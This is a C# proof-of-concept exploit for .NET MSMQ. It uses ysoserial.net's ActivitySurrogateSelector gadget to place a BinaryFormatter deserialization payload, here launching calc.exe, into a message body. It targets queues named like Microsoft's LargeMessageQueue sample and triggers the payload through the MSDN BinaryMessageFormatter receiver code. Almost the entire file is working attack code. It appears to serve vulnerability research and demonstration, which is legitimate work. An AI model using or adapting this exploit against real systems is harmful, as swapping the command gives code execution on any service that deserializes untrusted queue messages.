using System;
using System.Collections.Generic;
using System.IO;
using System.Messaging;
using System.Drawing;
using System.Runtime.Serialization.Formatters.Binary;

namespace MSMQ_NET35_Exploit
{
    public class MSMQ_Exploit
    {
        // Queue name must be identical to LargeMessageQueue project in order to attack it (https://github.com/Microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/netds/messagequeuing/LargeMessageQueue/CS)
        public static string QUEUE_PATH = @".\private$\largemessageq";
        public static bool TRANSACTIONAL = true;
        static void Main(string[] args)
        {
            Message maliciousMessage = generateBinaryMessageFormatterPayload();     
            
            sendMessage(maliciousMessage, QUEUE_PATH);
            Console.WriteLine("Using ActivitySurrogateSelector generator from ysoserial.net");
            Console.WriteLine("Message " + maliciousMessage + " sent! Press enter to receive...");
            Console.ReadLine();
            // Run MSDN code - https://msdn.microsoft.com/en-us/library/system.messaging.binarymessageformatter(v=vs.110).aspx
            ReceiveMessage();

            Console.ReadKey();
        }

        /*
         * Send message to queue
         */
        public static void sendMessage(Message myMessage, string queuePath)
        {
            if (!MessageQueue.Exists(queuePath))
            {
                MessageQueue.Create(queuePath, TRANSACTIONAL);
            }
            MessageQueueTransaction transaction = new MessageQueueTransaction();
            transaction.Begin();
            MessageQueue myQueue = new MessageQueue(queuePath, TRANSACTIONAL);
            BinaryMessageFormatter bmf = new BinaryMessageFormatter();
            
            myQueue.Send(myMessage, transaction);
            transaction.Commit();
            myQueue.Close();
        }

        /* This code creates a gadget that will be executed when deserialized by BinaryFormatter,
         * which is the internal deserializer for BinaryMessageFormatter.
         * Taken from ysoserial.net - https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs
         * This gadget was created by James Forshaw
         * 
         * This method generates a Message object that uses BinaryMessageFormatter as it formatter, but
         * manually writes the exploit gadget into Message.Body
         */
        public static Message generateBinaryMessageFormatterPayload()
        {
            ActivitySurrogateSelectorGenerator asg = new ActivitySurrogateSelectorGenerator();

            // Retrieve gadget as BinaryFormatter exploit
            byte[] o = (byte[])asg.Generate("calc.exe", "binaryformatter", false);
            BinaryFormatter bf = new BinaryFormatter();
            Message exploitMessage = new Message();
            BinaryMessageFormatter bmf = new BinaryMessageFormatter();

            // Manually write gadget bytes into message body stream
            MemoryStream ms = new MemoryStream();
            exploitMessage.BodyStream = ms;
            exploitMessage.BodyStream.Write(o, 0, o.Length);
            exploitMessage.BodyType = 768; // Body type for objects

            return exploitMessage;
        }



        /* Code from https://msdn.microsoft.com/en-us/library/system.messaging.binarymessageformatter(v=vs.110).aspx
         * Only changes made is in replacing hardcoded queue name with QUEUE_PATH, and converting queue to support transactions
         * 
         * Exception will be thrown by casting in "Bitmap myImage = (Bitmap)myMessage.Body;"
         */

        //**************************************************
        // Receives a message containing an image.
        //**************************************************
        public static void ReceiveMessage()
		{

			try
			{

                MessageQueueTransaction transaction = new MessageQueueTransaction();
                transaction.Begin();
                // Connect to the a queue on the local computer.
                MessageQueue myQueue = new MessageQueue(QUEUE_PATH, TRANSACTIONAL);

				// Set the formatter to indicate body contains an Order.
				myQueue.Formatter = new BinaryMessageFormatter();

                // Receive and format the message. 
                System.Messaging.Message myMessage = myQueue.Receive();
                transaction.Commit();
                Bitmap myImage = (Bitmap)myMessage.Body;

				// This will be saved in the \bin\debug or \bin\retail folder.
				myImage.Save("ReceivedImage.bmp",System.Drawing.Imaging.ImageFormat.Bmp);


			}

			catch (MessageQueueException)
			{
				// Handle Message Queuing exceptions.
			}

			// Handle invalid serialization format.
			catch (InvalidOperationException e)
			{
				Console.WriteLine(e.Message);
			}

			catch (IOException e)
			{
				// Handle file access exceptions.
			}

			// Catch other exceptions as necessary.

			return;
		}
 
    }
 }
